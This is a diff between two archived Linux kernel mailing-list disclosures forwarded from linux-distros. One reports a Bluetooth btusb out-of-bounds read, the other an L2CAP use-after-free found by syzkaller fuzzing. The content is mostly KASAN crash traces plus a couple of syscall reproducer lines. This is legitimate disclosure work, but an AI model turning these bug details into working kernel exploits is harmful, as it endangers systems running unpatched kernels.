@@ -3,39 +3,39 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 X-Spam-Level: 
 X-Spam-Status: No, score=-1.5 required=3.0 tests=HEADER_FROM_DIFFERENT_DOMAINS,
-	MAILING_LIST_MULTI,SPF_PASS,UPPERCASE_50_75,USER_AGENT_MUTT autolearn=ham
-	autolearn_force=no version=3.4.0
+	MAILING_LIST_MULTI,SPF_PASS,UPPERCASE_50_75,URIBL_BLOCKED,USER_AGENT_MUTT
+	autolearn=ham autolearn_force=no version=3.4.0
 Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id 98E64C0044C
-	for <linux-kernel@archiver.kernel.org>; Wed, 31 Oct 2018 13:57:38 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id DB67DC0044C
+	for <linux-kernel@archiver.kernel.org>; Wed, 31 Oct 2018 13:58:45 +0000 (UTC)
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.kernel.org (Postfix) with ESMTP id E396920685
-	for <linux-kernel@archiver.kernel.org>; Wed, 31 Oct 2018 13:57:36 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org E396920685
+	by mail.kernel.org (Postfix) with ESMTP id 4924B20664
+	for <linux-kernel@archiver.kernel.org>; Wed, 31 Oct 2018 13:58:44 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 4924B20664
 Authentication-Results: mail.kernel.org; dmarc=none (p=none dis=none) header.from=openwall.com
 Authentication-Results: mail.kernel.org; spf=none smtp.mailfrom=linux-kernel-owner@vger.kernel.org
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1729424AbeJaWzn (ORCPT
+        id S1729470AbeJaW4u (ORCPT
         <rfc822;linux-kernel@archiver.kernel.org>);
-        Wed, 31 Oct 2018 18:55:43 -0400
-Received: from mother.openwall.net ([195.42.179.200]:37237 "HELO
+        Wed, 31 Oct 2018 18:56:50 -0400
+Received: from mother.openwall.net ([195.42.179.200]:37559 "HELO
         mother.openwall.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with SMTP id S1729382AbeJaWzn (ORCPT
+        with SMTP id S1729410AbeJaW4t (ORCPT
         <rfc822;linux-kernel@vger.kernel.org>);
-        Wed, 31 Oct 2018 18:55:43 -0400
-Received: (qmail 23589 invoked from network); 31 Oct 2018 13:50:48 -0000
+        Wed, 31 Oct 2018 18:56:49 -0400
+Received: (qmail 24347 invoked from network); 31 Oct 2018 13:51:50 -0000
 Received: from localhost (HELO pvt.openwall.com) (127.0.0.1)
-  by localhost with SMTP; 31 Oct 2018 13:50:48 -0000
+  by localhost with SMTP; 31 Oct 2018 13:51:50 -0000
 Received: by pvt.openwall.com (Postfix, from userid 503)
-        id 4D7A1AA7CB; Wed, 31 Oct 2018 14:42:28 +0100 (CET)
-Date:   Wed, 31 Oct 2018 14:42:28 +0100
+        id 10500AA7CB; Wed, 31 Oct 2018 14:51:43 +0100 (CET)
+Date:   Wed, 31 Oct 2018 14:51:43 +0100
 From:   Solar Designer <solar@openwall.com>
 To:     Marcel Holtmann <marcel@holtmann.org>,
         Johan Hedberg <johan.hedberg@gmail.com>
 Cc:     linux-bluetooth@vger.kernel.org, linux-kernel@vger.kernel.org,
         netdev@vger.kernel.org
-Subject: 4.19.0-rc3 Bluetooth out-of-bounds read in btusb_work
-Message-ID: <20181031134228.GA24628@openwall.com>
+Subject: 4.19.0-rc3 Bluetooth use-after-free in lock_sock_nested
+Message-ID: <20181031135143.GB24628@openwall.com>
 Mime-Version: 1.0
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
@@ -59,283 +59,485 @@ was made on whether these are security issues or not (e.g., sufficiently
 privileged access might be required to trigger them), however per
 linux-distros list policy I'll also post about them to oss-security.
 
+As you can see below, the sender of this message offered to coordinate
+with security@k.o and asked for a CVE ID.  However, this was in response
+to my questions about those aspects as it relates to the sender's other
+report (forwarded separately), and I don't know whether the sender
+actually proceeded to coordinate with security@k.o (I tried asking the
+sender and got no response) and no CVE ID was assigned by distros (since
+the sender also didn't respond to my inquiry about security relevance).
+
 ----- Forwarded message from "zhrzhang(??????)" <zhrzhang at tencent.com> -----
 
 From: zhrzhang(??????) <zhrzhang at tencent.com>
 To: <linux-distros at vs.openwall.org>
-Subject: 4.19.0-rc3 global-out-of-bounds read in btusb_work
-Date: Tue, 16 Oct 2018 11:51:05 +0000
+Subject: 4.19-rc3 use-after-free in lock_sock_nested
+Date: Wed, 17 Oct 2018 03:00:10 +0000
 
 
 Hello:
-       When I use syzkaller to fuzz the bluetooth , I found this out-of-bound read, KASAN and UBSAN will show me the bug. The log is as below.
+       When I use syzkaller to fuzz the Bluetooth, KASAN report this bug, I would like to ask for 7 days of embargo, maybe 2018/10/24 public disclosure for this issue? I will coordinate with security at kernel.org, and I would like distros to assign one CVE for this issue..
 
-writev(r2, &(0x7f0000003680)=[{&(0x7f0000000580)="e2", 0x1}], 0x1)
-getsockopt$bt_hci(r1, 0x0, 0x3, &(0x7f0000000000)=""/66, &(0x7f0000000080)=0x42)
+The log and poc and config will paste below:
 
-[  130.005168] SELinux: unrecognized netlink message: protocol=0 nlmsg_type=1094 sclass=netlink_route_socket pig=13485 comm=syz-executor1
-[  130.009996] ================================================================================
-[  130.010100] UBSAN: Undefined behaviour in drivers/bluetooth/btusb.c:1470:19
-[  130.010100] index 3 is out of range for type 'int [3]'
-[  130.010100] CPU: 0 PID: 5 Comm: kworker/0:0 Not tainted 4.19.0-rc3 #2
-[  130.012507] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
-[  130.012507] Workqueue: events btusb_work
-[  130.012507] Call Trace:
-[  130.012507]  dump_stack+0xca/0x13e
-[  130.012507]  ubsan_epilogue+0xe/0x7f
-[  130.012507]  __ubsan_handle_out_of_bounds+0x169/0x1b5
-[  130.012507]  ? __ubsan_handle_shift_out_of_bounds+0x31d/0x31d
-[  130.016184]  ? find_held_lock+0x2d/0x110
-[  130.016184]  btusb_work+0xec7/0xf40
-[  130.016184]  process_one_work+0xa99/0x18f0
-[  130.016184]  ? max_active_store+0x130/0x130
-[  130.016184]  ? _raw_spin_unlock_irq+0x24/0x30
-[  130.016184]  worker_thread+0x90/0xea0
-[  130.016184]  ? process_one_work+0x18f0/0x18f0
-[  130.016184]  kthread+0x347/0x410
-[  130.019309]  ? kthread_create_worker_on_cpu+0xe0/0xe0
-[  130.019309]  ret_from_fork+0x3a/0x50
-[  130.019309] ================================================================================
-[  130.021363] ================================================================================
-[  130.022188] UBSAN: Undefined behaviour in drivers/bluetooth/btusb.c:1470:13
-[  130.022383] load of address 00000000a1b02f3e with insufficient space
-[  130.022383] for an object of type 'const int'
-[  130.022383] CPU: 0 PID: 5 Comm: kworker/0:0 Not tainted 4.19.0-rc3 #2
-[  130.022383] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
-[  130.022383] Workqueue: events btusb_work
-[  130.022383] Call Trace:
-[  130.022383]  dump_stack+0xca/0x13e
-[  130.022383]  ubsan_epilogue+0xe/0x7f
-[  130.022383]  ubsan_type_mismatch_common.part.5.cold.9+0x195/0x1ae
-[  130.022383]  ? _raw_spin_unlock_irqrestore+0x40/0x50
-[  130.022383]  ? handle_null_ptr_deref+0x220/0x220
-[  130.022383]  ? ubsan_epilogue+0x50/0x7f
-[  130.022383]  ? __ubsan_handle_out_of_bounds+0x16e/0x1b5
-[  130.022383]  __ubsan_handle_type_mismatch_v1+0x11d/0x15b
-[  130.022383]  ? ubsan_type_mismatch_common.part.5.cold.9+0x1ae/0x1ae
-[  130.022383]  btusb_work+0xe53/0xf40
-[  130.022383]  process_one_work+0xa99/0x18f0
-[  130.022383]  ? max_active_store+0x130/0x130
-[  130.022383]  ? _raw_spin_unlock_irq+0x24/0x30
-[  130.022383]  worker_thread+0x90/0xea0
-[  130.022383]  ? process_one_work+0x18f0/0x18f0
-[  130.022383]  kthread+0x347/0x410
-[  130.022383]  ? kthread_create_worker_on_cpu+0xe0/0xe0
-[  130.022383]  ret_from_fork+0x3a/0x50
-[  130.022383] ================================================================================
-[  130.035354] ==================================================================
-[  130.036153] BUG: KASAN: global-out-of-bounds in btusb_work+0xd0f/0xf40
-[  130.036153] Read of size 4 at addr ffffffffa99c9fec by task kworker/0:0/5
-[  130.036153]
-[  130.036153] CPU: 0 PID: 5 Comm: kworker/0:0 Not tainted 4.19.0-rc3 #2
-[  130.036153] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
-[  130.036153] Workqueue: events btusb_work
-[  130.036153] Call Trace:
-[  130.036153]  dump_stack+0xca/0x13e
-[  130.036153]  print_address_description.cold.3+0x63/0x23b
-[  130.036153]  kasan_report.cold.4+0x66/0x94
-[  130.036153]  btusb_work+0xd0f/0xf40
-[  130.036153]  process_one_work+0xa99/0x18f0
-[  130.036153]  ? max_active_store+0x130/0x130
-[  130.036153]  ? _raw_spin_unlock_irq+0x24/0x30
-[  130.036153]  worker_thread+0x90/0xea0
-[  130.036153]  ? process_one_work+0x18f0/0x18f0
-[  130.036153]  kthread+0x347/0x410
-[  130.043963]  ? kthread_create_worker_on_cpu+0xe0/0xe0
-[  130.044312]  ret_from_fork+0x3a/0x50
-[  130.044312]
-[  130.044312] The buggy address belongs to the variable:
-[  130.044312]  alts.64365+0xc/0xc0
-[  130.044312]
-[  130.044312] Memory state around the buggy address:
-[  130.044312]  ffffffffa99c9e80: fa fa fa fa 00 00 00 00 00 00 fa fa fa fa fa fa
-[  130.044312]  ffffffffa99c9f00: 00 00 00 00 00 00 fa fa fa fa fa fa 00 00 07 fa
-[  130.044312] >ffffffffa99c9f80: fa fa fa fa 00 00 00 00 fa fa fa fa 00 04 fa fa
-[  130.044312]                                                           ^
-[  130.049350]  ffffffffa99ca000: fa fa fa fa 00 fa fa fa fa fa fa fa 04 fa fa fa
-[  130.050036]  ffffffffa99ca080: fa fa fa fa 00 04 fa fa fa fa fa fa 00 00 00 01
-[  130.050613] ==================================================================
-[  130.050613] Disabling lock debugging due to kernel taint
-[  130.052209] Kernel panic - not syncing: panic_on_warn set ...
-[  130.052209]
-[  130.052925] CPU: 0 PID: 5 Comm: kworker/0:0 Tainted: G    B             4.19.0-rc3 #2
-[  130.053087] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
-[  130.053087] Workqueue: events btusb_work
-[  130.053087] Call Trace:
-[  130.055246]  dump_stack+0xca/0x13e
-[  130.055246]  panic+0x23b/0x4ad
-[  130.055246]  ? __warn_printk+0xdb/0xdb
-[  130.055246]  ? trace_hardirqs_on+0x55/0x1c0
-[  130.055246]  ? trace_hardirqs_on+0x55/0x1c0
-[  130.055246]  kasan_end_report+0x43/0x49
-[  130.055246]  kasan_report.cold.4+0x82/0x94
-[  130.055246]  btusb_work+0xd0f/0xf40
-[  130.055246]  process_one_work+0xa99/0x18f0
-[  130.055246]  ? max_active_store+0x130/0x130
-[  130.055246]  ? _raw_spin_unlock_irq+0x24/0x30
-[  130.055246]  worker_thread+0x90/0xea0
-[  130.055246]  ? process_one_work+0x18f0/0x18f0
-[  130.055246]  kthread+0x347/0x410
-[  130.055246]  ? kthread_create_worker_on_cpu+0xe0/0xe0
-[  130.055246]  ret_from_fork+0x3a/0x50
-[  130.055246] Dumping ftrace buffer:
-[  130.055246]    (ftrace buffer empty)
-[  130.055246] Kernel Offset: 0x25800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
-[  130.055246] Rebooting in 86400 seconds..
+LOG:
+[  392.058408] ==================================================================
+[  392.059151] BUG: KASAN: use-after-free in __lock_acquire+0x321c/0x4740
+[  392.059876] Read of size 8 at addr ffff880069d266a0 by task kworker/u5:0/684
+[  392.060683]
+[  392.060850] CPU: 0 PID: 684 Comm: kworker/u5:0 Not tainted 4.19.0-rc3 #2
+[  392.061532] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
+[  392.062471] Workqueue: hci0 hci_rx_work
+[  392.062867] Call Trace:
+[  392.063144]  dump_stack+0xe8/0x169
+[  392.063521]  ? __lock_acquire+0x321c/0x4740
+[  392.063952]  print_address_description+0x60/0x229
+[  392.064450]  ? __lock_acquire+0x321c/0x4740
+[  392.064880]  kasan_report.cold.6+0xaf/0x2ef
+[  392.065310]  __lock_acquire+0x321c/0x4740
+[  392.065741]  ? mark_held_locks+0x140/0x140
+[  392.066162]  ? __lock_acquire+0x6ea/0x4740
+[  392.066602]  ? _raw_spin_unlock_irqrestore+0x37/0x60
+[  392.067103]  ? mark_held_locks+0x140/0x140
+[  392.067548]  ? del_timer+0xaf/0xf0
+[  392.067906]  ? lock_downgrade+0x5e0/0x5e0
+[  392.068323]  ? trace_hardirqs_off+0x50/0x1c0
+[  392.068778]  ? _raw_spin_unlock_irqrestore+0x37/0x60
+[  392.069281]  ? del_timer+0xb4/0xf0
+[  392.069656]  lock_acquire+0x115/0x2d0
+[  392.070038]  ? lock_sock_nested+0x41/0x120
+[  392.070464]  _raw_spin_lock_bh+0x2f/0x40
+[  392.070876]  ? lock_sock_nested+0x41/0x120
+[  392.071301]  lock_sock_nested+0x41/0x120
+[  392.071713]  l2cap_sock_teardown_cb+0x8d/0x480
+[  392.072168]  l2cap_chan_del+0xb6/0x8c0
+[  392.072576]  l2cap_conn_del.isra.46+0x335/0x690
+[  392.073038]  l2cap_connect_cfm+0x8df/0xdf0
+[  392.073457]  ? find_held_lock+0x2d/0x110
+[  392.073879]  ? hci_cmd_status_evt+0x3013/0x6c70
+[  392.074343]  ? l2cap_chan_connect+0x18f0/0x18f0
+[  392.074850]  ? lock_acquire+0x115/0x2d0
+[  392.075282]  ? hci_cmd_status_evt+0x2e42/0x6c70
+[  392.075771]  hci_cmd_status_evt+0x45a2/0x6c70
+[  392.076231]  ? l2cap_chan_connect+0x18f0/0x18f0
+[  392.076739]  ? hci_le_meta_evt+0x3d90/0x3d90
+[  392.077186]  ? __skb_clone+0x5c3/0x7d0
+[  392.077566]  ? kmem_cache_alloc+0x201/0x230
+[  392.078036]  hci_event_packet+0x333e/0xa7b1
+[  392.078469]  ? hci_cmd_complete_evt+0xbf80/0xbf80
+[  392.078988]  ? __lock_acquire+0x6ea/0x4740
+[  392.079417]  ? mark_held_locks+0xc1/0x140
+[  392.079885]  ? _raw_spin_unlock_irqrestore+0x46/0x60
+[  392.080412]  ? __lock_acquire+0x6ea/0x4740
+[  392.080849]  ? __lock_acquire+0x6ea/0x4740
+[  392.081275]  ? lock_unpin_lock+0x3c0/0x3c0
+[  392.081717]  ? mark_held_locks+0x140/0x140
+[  392.082140]  ? __lock_acquire+0x6ea/0x4740
+[  392.082571]  ? __lock_acquire+0x6ea/0x4740
+[  392.083021]  ? find_held_lock+0x2d/0x110
+[  392.083427]  ? skb_dequeue+0x126/0x180
+[  392.083833]  ? mark_held_locks+0xc1/0x140
+[  392.084247]  ? _raw_spin_unlock_irqrestore+0x46/0x60
+[  392.084788]  ? lockdep_hardirqs_on+0x381/0x570
+[  392.085242]  ? hci_rx_work+0x450/0xab0
+[  392.085631]  hci_rx_work+0x450/0xab0
+[  392.086031]  process_one_work+0xabd/0x18d0
+[  392.086451]  ? max_active_store+0x130/0x130
+[  392.086913]  worker_thread+0x90/0xef0
+[  392.087298]  ? __kthread_parkme+0xf8/0x1a0
+[  392.087736]  ? process_one_work+0x18d0/0x18d0
+[  392.088202]  kthread+0x347/0x410
+[  392.088522]  ? kthread_create_worker_on_cpu+0xe0/0xe0
+[  392.089074]  ret_from_fork+0x3a/0x50
+[  392.089425]
+[  392.089581] Allocated by task 9922:
+[  392.089990]  kasan_kmalloc+0xbf/0xe0
+[  392.090362]  __kmalloc+0x129/0x290
+[  392.090697]  sk_prot_alloc+0x19b/0x2c0
+[  392.091101]  sk_alloc+0x36/0x650
+[  392.091436]  l2cap_sock_alloc.constprop.7+0x32/0x200
+[  392.091933]  l2cap_sock_create+0x10f/0x1b0
+[  392.092375]  bt_sock_create+0x159/0x2b0
+[  392.092750]  __sock_create+0x3e7/0x740
+[  392.093159]  __sys_socket+0xec/0x1f0
+[  392.093534]  __x64_sys_socket+0x6f/0xb0
+[  392.093928]  do_syscall_64+0xc2/0x500
+[  392.094312]  entry_SYSCALL_64_after_hwframe+0x49/0xbe
+[  392.094832]
+[  392.094990] Freed by task 9922:
+[  392.095349]  __kasan_slab_free+0x125/0x170
+[  392.095770]  kfree+0xe0/0x280
+[  392.096102]  __sk_destruct+0x4b2/0x670
+[  392.096491]  sk_destruct+0x6e/0x80
+[  392.096864]  __sk_free+0xc2/0x2e0
+[  392.097213]  sk_free+0x39/0x40
+[  392.097537]  l2cap_sock_kill.part.6+0x6a/0x80
+[  392.097997]  l2cap_sock_release+0x181/0x1d0
+[  392.098428]  __sock_release+0xce/0x240
+[  392.098827]  sock_close+0x15/0x20
+[  392.099218]  __fput+0x2c7/0x7a0
+[  392.099543]  task_work_run+0x14b/0x1c0
+[  392.099959]  get_signal+0x12ce/0x16c0
+[  392.100332]  do_signal+0x8f/0x16b0
+[  392.100667]  exit_to_usermode_loop+0x17f/0x1c0
+[  392.101161]  do_syscall_64+0x3ed/0x500
+[  392.101528]  entry_SYSCALL_64_after_hwframe+0x49/0xbe
+[  392.102061]
+[  392.102229] The buggy address belongs to the object at ffff880069d26600
+[  392.102229]  which belongs to the cache kmalloc-2048 of size 2048
+[  392.103492] The buggy address is located 160 bytes inside of
+[  392.103492]  2048-byte region [ffff880069d26600, ffff880069d26e00)
+[  392.104675] The buggy address belongs to the page:
+[  392.105169] page:ffffea0001a74800 count:1 mapcount:0 mapping:ffff88006cc02d80 index:0xffff880069d27700 compound_mapcount: 0
+[  392.106287] flags: 0x100000000008100(slab|head)
+[  392.106754] raw: 0100000000008100 ffffea0001428000 0000000400000004 ffff88006cc02d80
+[  392.107534] raw: ffff880069d27700 00000000800f000b 00000001ffffffff 0000000000000000
+[  392.108318] page dumped because: kasan: bad access detected
+[  392.108877]
+[  392.109068] Memory state around the buggy address:
+[  392.109544]  ffff880069d26580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[  392.110280]  ffff880069d26600: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  392.110995] >ffff880069d26680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  392.111730]                                ^
+[  392.112191]  ffff880069d26700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  392.112901]  ffff880069d26780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  392.113633] ==================================================================
+[  392.114368] Disabling lock debugging due to kernel taint
+[  392.114879] Kernel panic - not syncing: panic_on_warn set ...
+[  392.114879]
+[  392.115640] CPU: 0 PID: 684 Comm: kworker/u5:0 Tainted: G    B             4.19.0-rc3 #2
+[  392.116448] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
+[  392.117388] Workqueue: hci0 hci_rx_work
+[  392.117791] Call Trace:
+[  392.118046]  dump_stack+0xe8/0x169
+[  392.118410]  panic+0x209/0x480
+[  392.118722]  ? __warn_printk+0xdb/0xdb
+[  392.119101]  ? trace_hardirqs_off+0x50/0x1c0
+[  392.119550]  ? __lock_acquire+0x321c/0x4740
+[  392.119970]  kasan_end_report+0x43/0x49
+[  392.120373]  kasan_report.cold.6+0xcb/0x2ef
+[  392.120791]  __lock_acquire+0x321c/0x4740
+[  392.121201]  ? mark_held_locks+0x140/0x140
+[  392.121616]  ? __lock_acquire+0x6ea/0x4740
+[  392.122025]  ? _raw_spin_unlock_irqrestore+0x37/0x60
+[  392.122534]  ? mark_held_locks+0x140/0x140
+[  392.122946]  ? del_timer+0xaf/0xf0
+[  392.123314]  ? lock_downgrade+0x5e0/0x5e0
+[  392.123718]  ? trace_hardirqs_off+0x50/0x1c0
+[  392.124147]  ? _raw_spin_unlock_irqrestore+0x37/0x60
+[  392.124658]  ? del_timer+0xb4/0xf0
+[  392.125004]  lock_acquire+0x115/0x2d0
+[  392.125396]  ? lock_sock_nested+0x41/0x120
+[  392.125809]  _raw_spin_lock_bh+0x2f/0x40
+[  392.126204]  ? lock_sock_nested+0x41/0x120
+[  392.126634]  lock_sock_nested+0x41/0x120
+[  392.127031]  l2cap_sock_teardown_cb+0x8d/0x480
+[  392.127500]  l2cap_chan_del+0xb6/0x8c0
+[  392.127879]  l2cap_conn_del.isra.46+0x335/0x690
+[  392.128349]  l2cap_connect_cfm+0x8df/0xdf0
+[  392.128760]  ? find_held_lock+0x2d/0x110
+[  392.129155]  ? hci_cmd_status_evt+0x3013/0x6c70
+[  392.129623]  ? l2cap_chan_connect+0x18f0/0x18f0
+[  392.130076]  ? lock_acquire+0x115/0x2d0
+[  392.130478]  ? hci_cmd_status_evt+0x2e42/0x6c70
+[  392.130932]  hci_cmd_status_evt+0x45a2/0x6c70
+[  392.131392]  ? l2cap_chan_connect+0x18f0/0x18f0
+[  392.131846]  ? hci_le_meta_evt+0x3d90/0x3d90
+[  392.132273]  ? __skb_clone+0x5c3/0x7d0
+[  392.132667]  ? kmem_cache_alloc+0x201/0x230
+[  392.133089]  hci_event_packet+0x333e/0xa7b1
+[  392.133531]  ? hci_cmd_complete_evt+0xbf80/0xbf80
+[  392.134002]  ? __lock_acquire+0x6ea/0x4740
+[  392.134430]  ? mark_held_locks+0xc1/0x140
+[  392.134834]  ? _raw_spin_unlock_irqrestore+0x46/0x60
+[  392.135333]  ? __lock_acquire+0x6ea/0x4740
+[  392.135762]  ? __lock_acquire+0x6ea/0x4740
+[  392.136175]  ? lock_unpin_lock+0x3c0/0x3c0
+[  392.136606]  ? mark_held_locks+0x140/0x140
+[  392.137017]  ? __lock_acquire+0x6ea/0x4740
+[  392.137445]  ? __lock_acquire+0x6ea/0x4740
+[  392.137859]  ? find_held_lock+0x2d/0x110
+[  392.138256]  ? skb_dequeue+0x126/0x180
+[  392.138655]  ? mark_held_locks+0xc1/0x140
+[  392.139061]  ? _raw_spin_unlock_irqrestore+0x46/0x60
+[  392.139576]  ? lockdep_hardirqs_on+0x381/0x570
+[  392.140022]  ? hci_rx_work+0x450/0xab0
+[  392.140402]  hci_rx_work+0x450/0xab0
+[  392.140784]  process_one_work+0xabd/0x18d0
+[  392.141197]  ? max_active_store+0x130/0x130
+[  392.141634]  worker_thread+0x90/0xef0
+[  392.142005]  ? __kthread_parkme+0xf8/0x1a0
+[  392.142415]  ? process_one_work+0x18d0/0x18d0
+[  392.142866]  kthread+0x347/0x410
+[  392.143200]  ? kthread_create_worker_on_cpu+0xe0/0xe0
+[  392.143721]  ret_from_fork+0x3a/0x50
+[  392.144233] Dumping ftrace buffer:
+[  392.144595]    (ftrace buffer empty)
+[  392.144955] Kernel Offset: 0x37200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+[  392.146015] Rebooting in 86400 seconds..
 
 
 
-SELinux: unrecognized netlink message: protocol=0 nlmsg_type=1094 sclass=netlink_route_socket pig=13485 comm=syz-executor1
-================================================================================
-UBSAN: Undefined behaviour in drivers/bluetooth/btusb.c:1470:19
-index 3 is out of range for type 'int [3]'
-CPU: 0 PID: 5 Comm: kworker/0:0 Not tainted 4.19.0-rc3 #2
-Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
-Workqueue: events btusb_work
-Call Trace:
-__dump_stack lib/dump_stack.c:77 [inline]
-dump_stack+0xca/0x13e lib/dump_stack.c:113
-ubsan_epilogue+0xe/0x7f lib/ubsan.c:159
-__ubsan_handle_out_of_bounds+0x169/0x1b5 lib/ubsan.c:386
-btusb_work+0xec7/0xf40 drivers/bluetooth/btusb.c:1470
-process_one_work+0xa99/0x18f0 kernel/workqueue.c:2153
-worker_thread+0x90/0xea0 kernel/workqueue.c:2296
-kthread+0x347/0x410 kernel/kthread.c:246
-ret_from_fork+0x3a/0x50 arch/x86/entry/entry_64.S:413
-================================================================================
-================================================================================
-UBSAN: Undefined behaviour in drivers/bluetooth/btusb.c:1470:13
-load of address 00000000a1b02f3e with insufficient space
-for an object of type 'const int'
-CPU: 0 PID: 5 Comm: kworker/0:0 Not tainted 4.19.0-rc3 #2
-Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
-Workqueue: events btusb_work
-Call Trace:
-__dump_stack lib/dump_stack.c:77 [inline]
-dump_stack+0xca/0x13e lib/dump_stack.c:113
-ubsan_epilogue+0xe/0x7f lib/ubsan.c:159
-handle_object_size_mismatch lib/ubsan.c:310 [inline]
-ubsan_type_mismatch_common.part.5.cold.9+0x195/0x1ae lib/ubsan.c:322
-ubsan_type_mismatch_common lib/ubsan.c:318 [inline]
-__ubsan_handle_type_mismatch_v1+0x11d/0x15b lib/ubsan.c:350
-btusb_work+0xe53/0xf40 drivers/bluetooth/btusb.c:1470
-process_one_work+0xa99/0x18f0 kernel/workqueue.c:2153
-worker_thread+0x90/0xea0 kernel/workqueue.c:2296
-kthread+0x347/0x410 kernel/kthread.c:246
-ret_from_fork+0x3a/0x50 arch/x86/entry/entry_64.S:413
-================================================================================
+
 ==================================================================
-BUG: KASAN: global-out-of-bounds in btusb_work+0xd0f/0xf40 drivers/bluetooth/btusb.c:1470
-Read of size 4 at addr ffffffffa99c9fec by task kworker/0:0/5
+BUG: KASAN: use-after-free in __lock_acquire+0x321c/0x4740 kernel/locking/lockdep.c:3291
+Read of size 8 at addr ffff880069d266a0 by task kworker/u5:0/684
 
-CPU: 0 PID: 5 Comm: kworker/0:0 Not tainted 4.19.0-rc3 #2
+CPU: 0 PID: 684 Comm: kworker/u5:0 Not tainted 4.19.0-rc3 #2
 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
-Workqueue: events btusb_work
+Workqueue: hci0 hci_rx_work
 Call Trace:
 __dump_stack lib/dump_stack.c:77 [inline]
-dump_stack+0xca/0x13e lib/dump_stack.c:113
-print_address_description.cold.3+0x63/0x23b mm/kasan/report.c:256
+dump_stack+0xe8/0x169 lib/dump_stack.c:113
+print_address_description+0x60/0x229 mm/kasan/report.c:256
 kasan_report_error mm/kasan/report.c:354 [inline]
-kasan_report.cold.4+0x66/0x94 mm/kasan/report.c:412
-btusb_work+0xd0f/0xf40 drivers/bluetooth/btusb.c:1470
-process_one_work+0xa99/0x18f0 kernel/workqueue.c:2153
-worker_thread+0x90/0xea0 kernel/workqueue.c:2296
+kasan_report.cold.6+0xaf/0x2ef mm/kasan/report.c:412
+__lock_acquire+0x321c/0x4740 kernel/locking/lockdep.c:3291
+lock_acquire+0x115/0x2d0 kernel/locking/lockdep.c:3901
+__raw_spin_lock_bh include/linux/spinlock_api_smp.h:135 [inline]
+_raw_spin_lock_bh+0x2f/0x40 kernel/locking/spinlock.c:168
+spin_lock_bh include/linux/spinlock.h:334 [inline]
+lock_sock_nested+0x41/0x120 net/core/sock.c:2832
+l2cap_sock_teardown_cb+0x8d/0x480 net/bluetooth/l2cap_sock.c:1328
+l2cap_chan_del+0xb6/0x8c0 net/bluetooth/l2cap_core.c:596
+l2cap_conn_del.isra.46+0x335/0x690 net/bluetooth/l2cap_core.c:1703
+l2cap_connect_cfm+0x8df/0xdf0 net/bluetooth/l2cap_core.c:7311
+hci_connect_cfm include/net/bluetooth/hci_core.h:1241 [inline]
+hci_cs_create_conn net/bluetooth/hci_event.c:1708 [inline]
+hci_cmd_status_evt+0x45a2/0x6c70 net/bluetooth/hci_event.c:3382
+hci_event_packet+0x333e/0xa7b1 net/bluetooth/hci_event.c:5769
+hci_rx_work+0x450/0xab0 net/bluetooth/hci_core.c:4347
+process_one_work+0xabd/0x18d0 kernel/workqueue.c:2153
+worker_thread+0x90/0xef0 kernel/workqueue.c:2296
 kthread+0x347/0x410 kernel/kthread.c:246
 ret_from_fork+0x3a/0x50 arch/x86/entry/entry_64.S:413
 
-The buggy address belongs to the variable:
-alts.64365+0xc/0xc0
+Allocated by task 9922:
+set_track mm/kasan/kasan.c:460 [inline]
+kasan_kmalloc+0xbf/0xe0 mm/kasan/kasan.c:553
+__kmalloc+0x129/0x290 mm/slub.c:3751
+kmalloc include/linux/slab.h:518 [inline]
+sk_prot_alloc+0x19b/0x2c0 net/core/sock.c:1468
+sk_alloc+0x36/0x650 net/core/sock.c:1522
+l2cap_sock_alloc.constprop.7+0x32/0x200 net/bluetooth/l2cap_sock.c:1590
+l2cap_sock_create+0x10f/0x1b0 net/bluetooth/l2cap_sock.c:1636
+bt_sock_create+0x159/0x2b0 net/bluetooth/af_bluetooth.c:130
+__sock_create+0x3e7/0x740 net/socket.c:1275
+sock_create net/socket.c:1315 [inline]
+__sys_socket+0xec/0x1f0 net/socket.c:1345
+__do_sys_socket net/socket.c:1354 [inline]
+__se_sys_socket net/socket.c:1352 [inline]
+__x64_sys_socket+0x6f/0xb0 net/socket.c:1352
+do_syscall_64+0xc2/0x500 arch/x86/entry/common.c:290
+entry_SYSCALL_64_after_hwframe+0x49/0xbe
+
+Freed by task 9922:
+set_track mm/kasan/kasan.c:460 [inline]
+__kasan_slab_free+0x125/0x170 mm/kasan/kasan.c:521
